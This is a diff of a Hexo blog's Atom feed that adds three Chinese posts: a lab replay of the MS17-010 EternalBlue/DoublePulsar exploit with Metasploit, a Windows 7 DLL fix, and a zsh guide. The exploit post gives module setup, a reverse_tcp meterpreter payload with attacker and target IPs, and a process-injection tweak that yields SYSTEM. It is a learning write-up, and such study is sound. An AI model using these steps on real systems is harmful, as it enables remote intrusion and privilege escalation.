@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-07-31T09:29:42.939Z</updated>
+  <updated>2017-08-01T06:26:42.703Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,108 +16,143 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>linux下解压命令大全</title>
-    <link href="http://yoursite.com/2017/07/31/linux%E4%B8%8B%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"/>
-    <id>http://yoursite.com/2017/07/31/linux下解压命令大全/</id>
-    <published>2017-07-31T09:14:28.000Z</published>
-    <updated>2017-07-31T09:29:42.939Z</updated>
+    <title>ms17010-exploit</title>
+    <link href="http://yoursite.com/2017/08/01/ms17010-exploit/"/>
+    <id>http://yoursite.com/2017/08/01/ms17010-exploit/</id>
+    <published>2017-08-01T05:26:26.000Z</published>
+    <updated>2017-08-01T06:26:42.703Z</updated>
     
-    <content type="html"><![CDATA[<p>真的只是解压而已，有的时候记不住。。。</p>
-<h1 id="tar"><a href="#tar" class="headerlink" title=".tar"></a>.tar</h1><p>解包：tar xvf FileName.tar</p>
-<p>打包：tar cvf FileName.tar DirName</p>
-<p>(注：tar是打包，不是压缩！)</p>
-<h1 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h1><p>解压1：gunzip FileName.gz</p>
-<p>解压2：gzip -d FileName.gz</p>
-<p>压缩：gzip FileName</p>
-<h1 id="tar-gz-和-tgz"><a href="#tar-gz-和-tgz" class="headerlink" title=".tar.gz 和 .tgz"></a>.tar.gz 和 .tgz</h1><p>解压：tar zxvf FileName.tar.gz</p>
-<p>压缩：tar zcvf FileName.tar.gz DirName</p>
-<h1 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h1><p>解压1：bzip2 -d FileName.bz2</p>
-<p>解压2：bunzip2 FileName.bz2</p>
-<p>压缩： bzip2 -z FileName</p>
-<a id="more"></a>
-<h1 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title=".tar.bz2"></a>.tar.bz2</h1><p>解压：tar jxvf FileName.tar.bz2</p>
-<p>压缩：tar jcvf FileName.tar.bz2 DirName</p>
-<h1 id="bz"><a href="#bz" class="headerlink" title=".bz"></a>.bz</h1><p>解压1：bzip2 -d FileName.bz</p>
-<p>解压2：bunzip2 FileName.bz</p>
-<p>压缩：未知</p>
-<h1 id="tar-bz"><a href="#tar-bz" class="headerlink" title=".tar.bz"></a>.tar.bz</h1><p>解压：tar jxvf FileName.tar.bz</p>
-<p>压缩：未知</p>
-<h1 id="Z"><a href="#Z" class="headerlink" title=".Z"></a>.Z</h1><p>解压：uncompress FileName.Z</p>
-<p>压缩：compress FileName</p>
-<h1 id="tar-Z"><a href="#tar-Z" class="headerlink" title=".tar.Z"></a>.tar.Z</h1><p>解压：tar Zxvf FileName.tar.Z</p>
-<p>压缩：tar Zcvf FileName.tar.Z DirName</p>
-<h1 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h1><p>解压：unzip FileName.zip</p>
-<p>压缩：zip FileName.zip DirName</p>
-<h1 id="rar"><a href="#rar" class="headerlink" title=".rar"></a>.rar</h1><p>解压：rar x FileName.rar</p>
-<p>压缩：rar a FileName.rar DirName</p>
-<h1 id="lha"><a href="#lha" class="headerlink" title=".lha"></a>.lha</h1><p>解压：lha -e FileName.lha</p>
-<p>压缩：lha -a FileName.lha FileName</p>
-<h1 id="rpm"><a href="#rpm" class="headerlink" title=".rpm"></a>.rpm</h1><p>解包：rpm2cpio FileName.rpm | cpio -div</p>
-<h1 id="deb"><a href="#deb" class="headerlink" title=".deb"></a>.deb</h1><p>解包：ar p FileName.deb data.tar.gz | tar zxf -</p>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea</p>
-<p>解压：sEx x FileName.*</p>
-<p>压缩：sEx a FileName.* FileName</p>
-<p>sEx只是调用相关程序，本身并无压缩、解压功能，请注意！</p>
-<h1 id="gzip-命令"><a href="#gzip-命令" class="headerlink" title="gzip 命令"></a>gzip 命令</h1><p>减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。gzip 是在 Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。</p>
-<p>语法：gzip [选项] 压缩（解压缩）的文件名该命令的各选项含义如下：</p>
-<p>-c 将输出写到标准输出上，并保留原有文件。</p>
-<p>-d 将压缩文件解压。</p>
-<p>-l 对每个压缩文件，显示下列字段：    压缩文件的大小；未压缩文件的大小；压缩比；未压缩文件的名字</p>
-<p>-r 递归式地查找指定目录并压缩其中的所有文件或者是解压缩。</p>
-<p>-t 测试，检查压缩文件是否完整。</p>
-<p>-v 对每一个压缩和解压的文件，显示文件名和压缩比。</p>
-<p>-num 用指定的数字 num 调整压缩的速度，-1 或 –fast 表示最快压缩方法（低压缩比），-9 或–best表示最慢压缩方法（高压缩比）。系统缺省值为 6。指令实例：</p>
-<p>gzip <em>% 把当前目录下的每个文件压缩成 .gz 文件。gzip -dv </em>% 把当前目录下每个压缩的文件解压，并列出详细的信息。gzip -l *% 详细显示例1中每个压缩的文件的信息，并不解压。gzip usr.tar% 压缩 tar 备份文件 usr.tar，此时压缩文件的扩展名为.tar.gz。</p>
+    <content type="html"><![CDATA[<p>前言</p>
+<p>Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。</p>
+<a id="more"></a> 
+<h1 id="0x00-创建wine"><a href="#0x00-创建wine" class="headerlink" title="0x00 创建wine"></a>0x00 创建wine</h1><p>kali 64位</p>
+<p>kali 64位需要兼容32位环境才可以使用,执行以下命令来安装32位运行库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg --add-architecture i386</div><div class="line">apt-get update</div><div class="line">apt-get install lib32z1 lib32ncurses5</div><div class="line">apt-get install wine32</div><div class="line">wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
+<p>kali 32位<br>直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
+<p>即可<br><img src="http://op2ihgtv7.bkt.clouddn.com/2.png" alt=""></p>
+<h1 id="0x01修改exp"><a href="#0x01修改exp" class="headerlink" title="0x01修改exp"></a>0x01修改exp</h1><p>下载exp:<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/</a><br>解压文件将其中的deps文件夹和eternalblue_doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploits/windows/smb/下,我在这里将eternalblue_doublepulsar.rb重命名为ms17_010_smb_RCE.rb,方便以后的查找利用。<br>修改rb文件<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/1.png" alt=""></p>
+<h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>攻击机：kali 192.168.1.108</p>
+<p>靶 机：win7 64位 旗舰版 sp1(关闭防火墙)</p>
+<p>MSF使用就很简单了，下面列出主要的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos;use exploit/windows/smb/ms17_010_smb_RCE</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.108</div><div class="line">set rhost 192.168.1.107</div><div class="line">set target 9</div><div class="line">set targetarchitecture x64</div><div class="line">exploit&apos;</div></pre></td></tr></table></figure></p>
+<p>附效果图<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/3.jpg" alt=""></p>
+<h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>本人菜鸟，记录的都是很简单的一些东西，大牛绕过就可以了，谢谢，欢迎交流。md语法也是一边百度一边用，可能排版不好，请见谅。</p>
+<p>参考链接：<a href="https://www.t00ls.net/thread-39584-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-39584-1-1.html</a></p>
+<h1 id="纠正"><a href="#纠正" class="headerlink" title="纠正"></a>纠正</h1><p>按照上面的攻击过程获取到的权限一般都是local service \ network service，无法进行提权。问题出现在PROCESSINJECT(注入进程)的设置上。上文中注入的进程是svchost.exe,我们查看进程可以发现svchost.exe有多个进程，分别有local service \ network service \ system三种权限。<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/8.jpg" alt=""></p>
+<p>这也就难怪获得的权限是local service \ network service。<br>我们只需将注入进程修改为system / admin权限的进程就OK，例如explorer.exe、lsass.exe等等。为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/5.png" alt=""></p>
+<p>或者你可以每次利用时set PROCESSINJECT 进程名 设置即可。<br><img src="http://op2ihgtv7.bkt.clouddn.com/6.png" alt=""></p>
+<p>下面是获取到system权限的效果图<br><img src="http://op2ihgtv7.bkt.clouddn.com/7.jpg" alt=""></p>
+<p><a href="https://www.hi-noob.com/20170427/ms17_010/" title="ms17-010 exp复现" target="_blank" rel="external">原文:http://www.hi-noob.com/20170427/ms17_010</a></p>
+<h3 id="最后附一张成功图片"><a href="#最后附一张成功图片" class="headerlink" title="最后附一张成功图片"></a>最后附一张成功图片</h3><p>注：原文set target 9要根据实际msf show options来<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fi46qz6kikj214y0mddh3.jpg" alt=""></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;真的只是解压而已，有的时候记不住。。。&lt;/p&gt;
-&lt;h1 id=&quot;tar&quot;&gt;&lt;a href=&quot;#tar&quot; class=&quot;headerlink&quot; title=&quot;.tar&quot;&gt;&lt;/a&gt;.tar&lt;/h1&gt;&lt;p&gt;解包：tar xvf FileName.tar&lt;/p&gt;
-&lt;p&gt;打包：tar cvf FileName.tar DirName&lt;/p&gt;
-&lt;p&gt;(注：tar是打包，不是压缩！)&lt;/p&gt;
-&lt;h1 id=&quot;gz&quot;&gt;&lt;a href=&quot;#gz&quot; class=&quot;headerlink&quot; title=&quot;.gz&quot;&gt;&lt;/a&gt;.gz&lt;/h1&gt;&lt;p&gt;解压1：gunzip FileName.gz&lt;/p&gt;
-&lt;p&gt;解压2：gzip -d FileName.gz&lt;/p&gt;
-&lt;p&gt;压缩：gzip FileName&lt;/p&gt;
-&lt;h1 id=&quot;tar-gz-和-tgz&quot;&gt;&lt;a href=&quot;#tar-gz-和-tgz&quot; class=&quot;headerlink&quot; title=&quot;.tar.gz 和 .tgz&quot;&gt;&lt;/a&gt;.tar.gz 和 .tgz&lt;/h1&gt;&lt;p&gt;解压：tar zxvf FileName.tar.gz&lt;/p&gt;
-&lt;p&gt;压缩：tar zcvf FileName.tar.gz DirName&lt;/p&gt;
-&lt;h1 id=&quot;bz2&quot;&gt;&lt;a href=&quot;#bz2&quot; class=&quot;headerlink&quot; title=&quot;.bz2&quot;&gt;&lt;/a&gt;.bz2&lt;/h1&gt;&lt;p&gt;解压1：bzip2 -d FileName.bz2&lt;/p&gt;
-&lt;p&gt;解压2：bunzip2 FileName.bz2&lt;/p&gt;
-&lt;p&gt;压缩： bzip2 -z FileName&lt;/p&gt;
+      &lt;p&gt;前言&lt;/p&gt;
+&lt;p&gt;Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。&lt;/p&gt;
     
     </summary>
     
     
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
   </entry>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://yoursite.com/2017/07/31/hello-world/"/>
-    <id>http://yoursite.com/2017/07/31/hello-world/</id>
-    <published>2017-07-31T09:02:34.454Z</published>
-    <updated>2017-07-31T09:02:34.426Z</updated>
+    <title>win7安装wamp遇到api-ms-win-crt-runtime-l1-1-0.dll丢失问题</title>
+    <link href="http://yoursite.com/2017/08/01/win7sp1-apache/"/>
+    <id>http://yoursite.com/2017/08/01/win7sp1-apache/</id>
+    <published>2017-08-01T04:58:22.000Z</published>
+    <updated>2017-08-01T06:26:06.488Z</updated>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-]]></content>
+    <content type="html"><![CDATA[<p>本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。</p>
+<a id="more"></a> 
+<h5 id="1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"><a href="#1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单" class="headerlink" title="1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"></a>1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单</h5><p>但是大部分筒子面临的是安装VC2015失败，比如我。</p>
+<h5 id="2-直接下载对应DLL丢到系统盘"><a href="#2-直接下载对应DLL丢到系统盘" class="headerlink" title="2.直接下载对应DLL丢到系统盘"></a>2.直接下载对应DLL丢到系统盘</h5><pre><code>1. 把api-ms-win-crt-runtime-l1-1-0.dll下载到电脑
+2. 直接拷贝该文件到系统目录里：C:\Windows\System32目录下，64位系统为：C:\Windows\SysWOW64
+3. 最后在开始菜单中找到“运行(R)” 或者按快捷键“Win+R”，在弹出的框内输入“regsvr32 api-ms-win-crt-runtime-l1-1-0.dll”(不含双引号)，回车即可解决错误提示！
+</code></pre><p>（此方法我试过，出现提示“无法找到入口”之类，插入方式不对，不能达到高潮。）</p>
+<h5 id="3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"><a href="#3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）" class="headerlink" title="3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"></a>3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）</h5><h5 id="4-使用cmd安装"><a href="#4-使用cmd安装" class="headerlink" title="4.使用cmd安装"></a>4.使用cmd安装</h5><p>kb2999226更新程序，然后重装VC2015</p>
+<pre><code>1.  按下【Win+R】组合键打开运行，输入 cmd 点击确定打开命令提示符 ；
+2.  在命令提示符框中输入：net stop wuauserv 按下回车键，完成后先别急着关闭；
+3.  打开运行，输入：%windir% 点击确定打开文件夹；
+4.  在打开的该文件夹中找到“SoftwareDistribution”，并删除掉；
+5. 切换到命令提示符窗口，输入：net start wuauserv 按下回车键 后即可重新安装kb2999226 补丁了！
+</code></pre><p>（此方法我也试过，依然无效）</p>
+<h5 id="5-我的问题和成功解决的方法："><a href="#5-我的问题和成功解决的方法：" class="headerlink" title="5.我的问题和成功解决的方法："></a>5.我的问题和成功解决的方法：</h5><p>问题：需要安装kb2999226 x64，但是安装时提示0x80240037错误，无法安装<br>方法：</p>
+<pre><code>下载kb2999226更新程序，把kb2999226.msu改为kb2999226.cab，安装程序会变成压缩包；
+然后解压缩又出现一个kb2999226.cab的压缩包
+Win+R运行cmd
+输入dism /online /add-package /packagepath:&quot;路径\kb2999226.cab
+强制安装更新，然后再重装VC2015，就成功了
+</code></pre>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      &lt;p&gt;本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。&lt;/p&gt;
     
     </summary>
     
     
-      <category term="1111" scheme="http://yoursite.com/tags/1111/"/>
+      <category term="系统环境" scheme="http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何安装、配置和使用 zsh</title>
+    <link href="http://yoursite.com/2017/08/01/oh-my-zsh/"/>
+    <id>http://yoursite.com/2017/08/01/oh-my-zsh/</id>
+    <published>2017-08-01T03:51:11.000Z</published>
+    <updated>2017-08-01T06:25:57.715Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>如果你用 Mac，就可以直接看下一节<br>如果你用 Redhat Linux，执行：sudo yum install zsh<br>如果你用 Ubuntu Linux，执行：sudo apt-get install zsh<br>如果你用 Windows……去洗洗睡吧。</p>
+<a id="more"></a> 
+<p>安装完成后设置当前用户使用 zsh：chsh -s /bin/zsh，根据提示输入当前用户的密码就可以了。</p>
+<p>安装oh my zsh</p>
+<p>首先安装 git，安装方式同上，把 zsh 换成 git 即可。</p>
+<p>安装「oh my zsh」可以自动安装也可以手动安装。</p>
+<p>自动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</div></pre></td></tr></table></figure></p>
+<p>手动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh</div><div class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</div></pre></td></tr></table></figure></p>
+<p>都不复杂，安装完成之后退出当前会话重新打开一个终端窗口，你就可以见到这个彩色的提示了：</p>
+<h1 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h1><p>zsh 的配置主要集中在用户当前目录的.zshrc里，用 vim 或你喜欢的其他编辑器打开.zshrc，在最下面会发现这么一行字：</p>
+<pre><code>#Customize to your needs…
+</code></pre><p>可以在此处定义自己的环境变量和别名，当然，oh my zsh 在安装时已经自动读取当前的环境变量并进行了设置，你可以继续追加其他环境变量。</p>
+<p>接下来进行别名的设置，我自己的部分配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">alias  xxxx=&quot;ssh root@xx.xx.xx.xx&quot; #快捷ssh登录</div><div class="line"></div><div class="line">alias cls=&apos;clear&apos;</div><div class="line">alias ll=&apos;ls -l&apos;</div><div class="line">alias la=&apos;ls -a&apos;</div><div class="line">alias vi=&apos;vim&apos;</div><div class="line">alias javac=&quot;javac -J-Dfile.encoding=utf8&quot;</div><div class="line">alias grep=&quot;grep --color=auto&quot;</div><div class="line">alias -s html=subl   # 在命令行直接输入后缀为 html 的文件名，会在 subl 中打开</div><div class="line">alias -s rb=subl     # 在命令行直接输入 ruby 文件，会在 subl 中打开</div><div class="line">alias -s py=subl       # 在命令行直接输入 python 文件，会用 subl 中打开，以下类似</div><div class="line">alias -s js=subl</div><div class="line">alias -s c=subl</div><div class="line">alias -s java=subl</div><div class="line">alias -s txt=subl</div><div class="line">alias -s md=subl</div><div class="line">alias -s gz=&apos;tar -xzvf&apos;</div><div class="line">alias -s tgz=&apos;tar -xzvf&apos;</div><div class="line">alias -s zip=&apos;unzip&apos;</div><div class="line">alias -s bz2=&apos;tar -xjvf&apos;</div><div class="line">alias -s jar=&apos;java -jar&apos;</div></pre></td></tr></table></figure></p>
+<p>zsh 的牛粪之处在于不仅可以设置通用别名，还能针对文件类型设置对应的打开程序，比如：<br>alias -s html=mate，意思就是你在命令行输入 hello.html，zsh会为你自动打开 TextMat 并读取 hello.html； alias -s gz=’tar -xzvf’，表示自动解压后缀为 gz 的压缩包。</p>
+<p>总之，只有想不到，木有做不到，吓尿了吧。<br>设置完环境变量和别名之后，基本上就可以用了，如果你是个主题控，还可以玩玩 zsh 的主题。在 .zshrc 里找到ZSH_THEME，就可以设置主题了，默认主题是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZSH_THEME=”robbyrussell”</div></pre></td></tr></table></figure></p>
+<p>oh my zsh 提供了数十种主题，相关文件在~/.oh-my-zsh/themes目录下，你可以随意选择。</p>
+<h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>oh my zsh 项目提供了完善的插件体系，相关的文件在~/.oh-my-zsh/plugins目录下，默认提供了100多种，大家可以根据自己的实际学习和工作环境采用，想了解每个插件的功能，只要打开相关目录下的 zsh 文件看一下就知道了。插件也是在.zshrc里配置，找到plugins关键字，你就可以加载自己的插件了，系统默认加载 git ，你可以在后面追加内容，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plugins=(git textmate ruby autojump osx mvn gradle)</div></pre></td></tr></table></figure>
+<p>下面简单介绍几个：</p>
+<p>1、git：当你处于一个 git 受控的目录下时，Shell 会明确显示 「git」和 branch，如上图所示，另外对 git 很多命令进行了简化，例如 gco=’git checkout’、gd=’git diff’、gst=’git status’、g=’git’等等，熟练使用可以大大减少 git 的命令长度，命令内容可以参考~/.oh-my-zsh/plugins/git/git.plugin.zsh</p>
+<p>2、textmate：mr可以创建 ruby 的框架项目，tm finename 可以用 textmate 打开指定文件。</p>
+<p>3、osx：tab 增强，quick-look filename 可以直接预览文件，man-preview grep 可以生成 grep手册 的pdf 版本等。</p>
+<p>4、autojump：zsh 和 autojump 的组合形成了 zsh 下最强悍的插件，今天我们主要说说这货。</p>
+<p>首先安装autojump，如果你用 Mac，可以使用 brew 安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install autojump</div></pre></td></tr></table></figure></p>
+<p>如果是 Linux，去下载 autojump 的最新版本，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/joelthelion/autojump.git</div></pre></td></tr></table></figure></p>
+<p>解压缩后进入目录，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./install.py</div></pre></td></tr></table></figure></p>
+<p>最后把以下代码加入.zshrc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</div></pre></td></tr></table></figure></p>
+<p>至此，安装、配置、插件三位一体，终极 Shell 全面登场。退出终端会话重新登录，开始感受 zsh 的训疾如风！</p>
+<p>使用 zsh</p>
+<p>1、兼容 bash，原来使用 bash 的兄弟切换过来毫无压力，该咋用咋用。</p>
+<p>2、强大的历史纪录功能，输入 grep 然后用上下箭头可以翻阅你执行的所有 grep 命令。</p>
+<p>3、智能拼写纠正，输入gtep mactalk * -R，系统会提示：zsh: correct ‘gtep’ to ‘grep’ [nyae]? 比妹纸贴心吧，她们向来都是让你猜的……</p>
+<p>4、各种补全：路径补全、命令补全，命令参数补全，插件内容补全等等。触发补全只需要按一下或两下 tab 键，补全项可以使用 ctrl+n/p/f/b上下左右切换。比如你想杀掉 java 的进程，只需要输入 kill java + tab键，如果只有一个 java 进程，zsh 会自动替换为进程的 pid，如果有多个则会出现选择项供你选择。ssh + 空格 + 两个tab键，zsh会列出所有访问过的主机和用户名进行补全</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">##在命令前插入 sudo &#123;&#123;&#123;  </div><div class="line">#定义功能  </div><div class="line">sudo-command-line() &#123;  </div><div class="line">[[ -z $BUFFER ]] &amp;&amp; zle up-history  </div><div class="line">[[ $BUFFER != sudo\ * ]] &amp;&amp; BUFFER=&quot;sudo $BUFFER&quot;  </div><div class="line">zle end-of-line                 #光标移动到行末  </div><div class="line">&#125;  </div><div class="line">zle -N sudo-command-line  </div><div class="line">#定义快捷键为： [Esc] [Esc]  </div><div class="line">bindkey &quot;\e\e&quot; sudo-command-line  </div><div class="line">#&#125;&#125;&#125;</div></pre></td></tr></table></figure>
+<p>5、智能跳转，安装了autojump之后，zsh 会自动记录你访问过的目录，通过 j + 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过hadoop-1.0.0目录，输入j hado 即可正确跳转。j –stat 可以看你的历史路径库。</p>
+<p>6、目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转。</p>
+<p>7、在当前目录下输入 .. 或 … ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。</p>
+<p>8、通配符搜索：ls -l <strong>/*</strong>.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件太多就歇菜了。**</p>
+<p>9、更强的别名：请参考配置一节。</p>
+<p>10、插件支持：请参考插件一节。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;安装zsh&quot;&gt;&lt;a href=&quot;#安装zsh&quot; class=&quot;headerlink&quot; title=&quot;安装zsh&quot;&gt;&lt;/a&gt;安装zsh&lt;/h1&gt;&lt;p&gt;如果你用 Mac，就可以直接看下一节&lt;br&gt;如果你用 Redhat Linux，执行：sudo yum install zsh&lt;br&gt;如果你用 Ubuntu Linux，执行：sudo apt-get install zsh&lt;br&gt;如果你用 Windows……去洗洗睡吧。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="系统环境" scheme="http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
     
   </entry>
   
